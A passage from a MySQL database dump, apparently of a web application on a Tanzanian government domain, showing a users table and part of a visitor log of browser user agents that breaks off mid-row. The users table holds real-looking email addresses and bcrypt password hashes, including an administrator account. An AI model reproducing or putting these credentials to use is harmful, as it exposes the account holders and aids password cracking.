  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_login` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `expiring_date` date NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'Administrator','admin@tira.go.tz',NULL,'$2a$12$aS2edLLX/lBmt/EpbMnmouOjQJzQlrjdccuwc8P0n4t55De1F2yES','','','0000-00-00',NULL,'2020-06-14 04:31:13','2021-10-08 02:49:10'),(2,'alphan','alphanjohn@gmail.com',NULL,'$2y$10$AoX5do5kmPWaFyQqF8jmVe/EiwIu1WzbrI/YkwcR/2vXX3zFO15ve','','','0000-00-00',NULL,'2022-08-11 08:25:35','2022-08-11 08:25:35'),(3,'test2','egsoc@egsoc.go.tz',NULL,'$2y$10$XblhziunrtcGBTfAYDZhI.xJ/sJz38v9Q.zl9/3la1EuJF0A5RwLa','','','0000-00-00',NULL,'2022-08-11 08:32:23','2022-08-11 08:32:23'),(4,'test4','egsoc@ega.go.tz',NULL,'$2y$10$y2uCgTh1UZdMW1ljZaHWHOF9EjPu.yXEHkVdgOicrhgNr.i7zjzgC','','','0000-00-00',NULL,'2022-08-11 08:33:40','2022-08-11 08:33:40');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `visitors_logs`
--

DROP TABLE IF EXISTS `visitors_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `visitors_logs` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `browserId` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `browserName` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `browserVersion` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `userAgent` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `os` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `osVersion` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=436 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `visitors_logs`
--

LOCK TABLES `visitors_logs` WRITE;
/*!40000 ALTER TABLE `visitors_logs` DISABLE KEYS */;
INSERT INTO `visitors_logs` VALUES (7,'1514401248','Chrome','83.0.4103.116','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36','Windows','NT 10.0','2020-06-27 11:12:03','2020-06-27 11:12:03'),(8,'399976577','Chrome','84.0.4147.89','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36','Windows','NT 10.0','2020-08-05 05:08:40','2020-08-05 05:08:40'),(9,'3219720555','Chrome','86.0.4240.75','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36','Windows','NT 10.0','2020-10-19 10:06:55','2020-10-19 10:06:55'),(10,'2254993920','Chrome','90.0.4430.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36','Windows','NT 10.0','2021-06-13 08:38:05','2021-06-13 08:38:05'),(11,'4003097485','Chrome','91.0.4472.77','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36','Windows','NT 10.0','2021-06-14 09:24:49','2021-06-14 09:24:49'),(12,'792526207','Chrome','91.0.4472.77','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36','Windows','NT 10.0','2021-06-14 17:23:02','2021-06-14 17:23:02'),(13,'1597388010','Chrome','91.0.4472.77','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36','Windows','NT 10.0','2021-06-15 06:10:08','2021-06-15 06:10:08'),(14,'519499901','Chrome','91.0.4472.101','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36','Windows','NT 10.0','2021-06-16 05:43:57','2021-06-16 05:43:57'),(15,'841805890','Chrome','91.0.4472.106','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36','Windows','NT 10.0','2021-06-17 14:23:43','2021-06-17 14:23:43'),(16,'4143783568','Chrome','89.0.4389.105','Mozilla/5.0 (Linux; Android 6.0.1; SM-G925F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36','Android','6.0.1','2021-06-19 06:46:31','2021-06-19 06:46:31'),(17,'1057539092','Mobile Safari','10.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1','iOS','10.3.1','2021-06-20 12:41:47','2021-06-20 12:41:47'),(18,'2931564642','Chrome','91.0.4472.114','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36','Windows','NT 10.0','2021-06-22 03:21:13','2021-06-22 03:21:13'),(19,'779227816','Chrome','91.0.4472.114','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36','Windows','NT 10.0','2021-06-22 13:30:34','2021-06-22 13:30:34'),(20,'2438620051','Chrome','91.0.4472.114','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36','Windows','NT 10.0','2021-06-23 17:45:17','2021-06-23 17:45:17'),(21,'2628712207','Chrome','91.0.4472.114','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36','Windows','NT 10.0','2021-06-25 19:20:24','2021-06-25 19:20:24'),(22,'2846666480','Mobile Safari','10.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1','iOS','10.3.1','2021-06-27 18:03:09','2021-06-27 18:03:09'),(23,'4271773779','Mobile Safari','13.0.3','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','iOS','13.2.3','2021-06-27 18:03:44','2021-06-27 18:03:44'),(24,'904489244','Chrome','91.0.4472.124','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Windows','NT 10.0','2021-07-01 06:41:47','2021-07-01 06:41:47'),(25,'1950095434','Chrome','91.0.4472.124','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Windows','NT 10.0','2021-07-05 08:35:28','2021-07-05 08:35:28'),(26,'1043298765','Chrome','91.0.4472.124','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Windows','NT 10.0','2021-07-06 11:30:20','2021-07-06 11:30:20'),(27,'4040973509','Firefox','67.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0','Windows','NT 10.0','2021-07-16 06:04:19','2021-07-16 06:04:19'),(28,'2564103079','Mobile Safari','13.0.3','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','iOS','13.2.3','2021-07-17 12:38:06','2021-07-17 12:38:06'),(29,'1006421051','Chrome','91.0.4472.164','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36','Windows','NT 10.0','2021-07-19 10:01:22','2021-07-19 10:01:22'),(30,'997338073','Chrome','92.0.4515.107','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36','Windows','NT 10.0','2021-07-27 07:53:17','2021-07-27 07:53:17'),(31,'1081752201','Mobile Safari','10.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1','iOS','10.3.1','2021-07-28 15:35:41','2021-07-28 15:35:41'),(32,'2746491122','Chrome','92.0.4515.131','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36','Windows','NT 10.0','2021-08-05 05:31:59','2021-08-05 05:31:59'),(33,'858023180','Chrome','92.0.4515.131','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36','Windows','NT 10.0','2021-08-06 06:49:48','2021-08-06 06:49:48'),(34,'2642244143','Chrome','93.0.4577.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36','Windows','NT 10.0','2021-09-11 08:54:49','2021-09-11 08:54:49'),(35,'928240925','Chrome','93.0.4577.63','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36','Linux','x86_64','2021-09-11 10:45:28','2021-09-11 10:45:28'),(36,'7032588','Chrome','93.0.4577.63','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Mobile Safari/537.36','Android','6.0','2021-09-12 07:24:18','2021-09-12 07:24:18'),(37,'3475456421','Chrome','93.0.4577.63','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Mobile Safari/537.36','Android','6.0','2021-09-12 07:24:41','2021-09-12 07:24:41'),(38,'3553092579','Chrome','93.0.4577.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36','Windows','NT 10.0','2021-09-13 12:22:03','2021-09-13 12:22:03'),(39,'2554049866','Chrome','93.0.4577.82','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36','Windows','NT 10.0','2021-09-16 05:56:08','2021-09-16 05:56:08'),(40,'1496658469','Chrome','93.0.4577.82','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36','Linux','x86_64','2021-09-19 13:10:56','2021-09-19 13:10:56'),(41,'3478044887','Chrome','93.0.4577.82','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36','Linux','x86_64','2021-09-20 06:39:06','2021-09-20 06:39:06'),(42,'1642887794','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-20 06:53:23','2021-09-20 06:53:23'),(43,'3319553820','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-20 06:57:07','2021-09-20 06:57:07'),(44,'2326083630','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-20 07:05:07','2021-09-20 07:05:07'),(45,'3251456635','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-20 07:28:57','2021-09-20 07:28:57'),(46,'2578667287','Chrome','93.0.4577.82','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36','Linux','x86_64','2021-09-20 07:46:03','2021-09-20 07:46:03'),(47,'3969231667','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-20 09:04:33','2021-09-20 09:04:33'),(48,'2517118823','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-21 17:44:46','2021-09-21 17:44:46'),(49,'363927433','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-21 17:51:58','2021-09-21 17:51:58'),(50,'3264825405','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 10:50:32','2021-09-26 10:50:32'),(51,'3810936055','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 10:51:14','2021-09-26 10:51:14'),(52,'3390390277','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 10:53:18','2021-09-26 10:53:18'),(53,'1003235934','Mobile Safari','10.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1','iOS','10.3.1','2021-09-26 10:55:40','2021-09-26 10:55:40'),(54,'1506105151','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 10:57:56','2021-09-26 10:57:56'),(55,'730314484','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:00:01','2021-09-26 11:00:01'),(56,'1671016567','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:01:21','2021-09-26 11:01:21'),(57,'3846624551','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:04:44','2021-09-26 11:04:44'),(58,'1420189137','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:08:51','2021-09-26 11:08:51'),(59,'727366539','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:10:28','2021-09-26 11:10:28'),(60,'2865015099','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:11:22','2021-09-26 11:11:22'),(61,'1993846285','Chrome','93.0.4577.82','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36','Android','6.0','2021-09-26 11:12:29','2021-09-26 11:12:29'),(62,'963949613','Chrome','94.0.4606.71','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36','Linux','x86_64','2021-10-04 08:20:44','2021-10-04 08:20:44'),(63,'981399757','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-06 13:56:37','2021-10-06 13:56:37'),(64,'3090126127','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-06 13:57:40','2021-10-06 13:57:40'),(65,'2959358744','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-06 13:58:03','2021-10-06 13:58:03'),(66,'894864223','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-07 05:31:34','2021-10-07 05:31:34'),(67,'4199307218','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-07 05:34:37','2021-10-07 05:34:37'),(68,'3844392928','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-07 05:35:33','2021-10-07 05:35:33'),(69,'2599753801','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-07 06:07:05','2021-10-07 06:07:05'),(70,'3467905923','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-07 06:11:01','2021-10-07 06:11:01'),(71,'3295926932','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-08 12:57:06','2021-10-08 12:57:06'),(72,'3193108850','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-08 12:58:16','2021-10-08 12:58:16'),(73,'4234113606','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-08 13:11:39','2021-10-08 13:11:39'),(74,'3088389947','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-08 13:13:20','2021-10-08 13:13:20'),(75,'4224368164','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-11 12:52:59','2021-10-11 12:52:59'),(76,'1831126704','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-17 19:07:38','2021-10-17 19:07:38'),(77,'369944548','Chrome','94.0.4606.71','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36','Android','6.0','2021-10-18 07:30:13','2021-10-18 07:30:13'),(78,'3091748894','Chrome','94.0.4606.81','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36','Linux','x86_64','2021-10-25 09:03:35','2021-10-25 09:03:35'),(79,'4096195069','Chrome','94.0.4606.81','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36','Android','6.0','2021-10-25 09:52:48','2021-10-25 09:52:48'),(80,'1641243843','Chrome','94.0.4606.81','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36','Linux','x86_64','2021-10-25 12:39:06','2021-10-25 12:39:06'),(81,'3393694938','Firefox','93.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0','Ubuntu',NULL,'2021-10-25 12:39:43','2021-10-25 12:39:43'),(82,'1569298711','Chrome','95.0.4638.54','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36','Linux','x86_64','2021-10-26 05:43:06','2021-10-26 05:43:06'),(83,'3112285023','Chrome','95.0.4638.54','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36','Linux','x86_64','2021-10-26 05:46:11','2021-10-26 05:46:11'),(84,'326597605','Chrome','95.0.4638.54','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36','Linux','x86_64','2021-10-26 06:05:48','2021-10-26 06:05:48'),(85,'1933837870','Chrome','95.0.4638.54','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36','Linux','x86_64','2021-10-27 05:42:20','2021-10-27 05:42:20'),(86,'1308071491','Firefox','93.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0','Ubuntu',NULL,'2021-10-28 16:32:06','2021-10-28 16:32:06'),(87,'1597640844','Firefox','93.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0','Ubuntu',NULL,'2021-10-28 16:43:19','2021-10-28 16:43:19'),(88,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36','Linux','x86_64','2021-11-08 10:04:11','2021-11-08 10:04:11'),(89,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36','Linux','x86_64','2021-11-18 14:27:46','2021-11-18 15:54:48'),(90,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36','Linux','x86_64','2021-11-22 11:56:17','2021-11-22 11:56:17'),(91,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36','Linux','x86_64','2021-11-23 11:27:03','2021-11-23 16:12:35'),(92,'1554331059','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-23 13:26:40','2021-11-23 13:26:40'),(93,'154505629','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-23 13:27:10','2021-11-23 13:27:10'),(94,'2896436988','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-23 13:28:33','2021-11-23 13:28:33'),(95,'3195695944','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-23 13:30:02','2021-11-23 13:30:02'),(96,'2190751082','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-23 13:30:43','2021-11-23 13:31:00'),(97,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36','Linux','x86_64','2021-11-24 06:15:55','2021-11-24 16:31:34'),(98,'1003235934','Mobile Safari','10.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1','iOS','10.3.1','2021-11-24 06:30:52','2021-11-24 06:32:12'),(99,'653897905','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-24 08:45:10','2021-11-24 08:45:13'),(100,'4024288225','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-24 08:45:32','2021-11-24 08:45:32'),(101,'2333218993','Firefox','94.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0','Ubuntu',NULL,'2021-11-24 14:23:15','2021-11-24 14:23:15'),(102,'1775863200','Chrome','95.0.4638.69','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36','Android','6.0','2021-11-24 15:20:21','2021-11-24 15:20:21'),(103,'2821720569','Chrome','95.0.4638.69','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 